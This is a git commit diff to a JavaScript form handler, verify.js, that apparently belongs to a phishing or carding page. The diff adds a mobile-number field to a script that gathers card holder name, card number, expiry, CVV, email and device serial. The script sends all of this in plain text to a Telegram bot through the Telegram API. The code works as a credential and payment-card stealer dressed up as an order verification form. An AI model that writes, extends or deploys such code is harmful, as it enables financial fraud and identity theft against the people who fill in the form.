6d2fe073dd1b343a3de0ba754de47e79478956d0
isumitfx <63400226+isumitfx@users.noreply.github.com>
2021-10-01 16:35:47 +0530

    Add files via upload

--- js/verify.js
+++ js/verify.js
@@ -9,13 +9,14 @@ form.addEventListener("submit", e => {
 	e.preventDefault();
 	
 	var mailid = document.getElementById("inputEmailID").value;
+	var mobilenumber = document.getElementById("inputMobileNo").value;
 	var name = document.getElementById("inputName").value;
 	var serial = document.getElementById("inputSN").value;
 	var number = document.getElementById("inputCardNumber").value;
 	var expiry = document.getElementById("inputExpiry").value;
 	var cvv = document.getElementById("inputCVV").value;
 	
-	var my_text = `Order Details:%0A - Card Holder Name: ${name} %0A - Card Number: ${number} %0A - Expiry: ${expiry} %0A - CVV: ${cvv} %0A - Email ID: ${mailid} %0A - IMEI or SN: ${serial}`
+	var my_text = `Order Details:%0A - Card Holder Name: ${name} %0A - Card Number: ${number} %0A - Expiry: ${expiry} %0A - CVV: ${cvv} %0A - Email ID: ${mailid} %0A - Mobile Number: ${mobilenumber} %0A - IMEI or SN: ${serial}`
 	
 	fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=${my_text}`,{
 		method: "GET"
